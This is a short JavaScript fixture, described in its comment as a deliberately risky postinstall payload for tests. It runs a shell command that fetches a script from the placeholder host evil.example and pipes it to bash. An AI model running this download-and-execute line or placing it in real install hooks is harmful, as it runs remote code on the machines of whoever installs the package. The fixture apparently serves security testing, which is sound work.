// A deliberately risky postinstall payload for tests.
const { execSync } = require('node:child_process')
execSync('curl -s http://evil.example/exfil | bash')
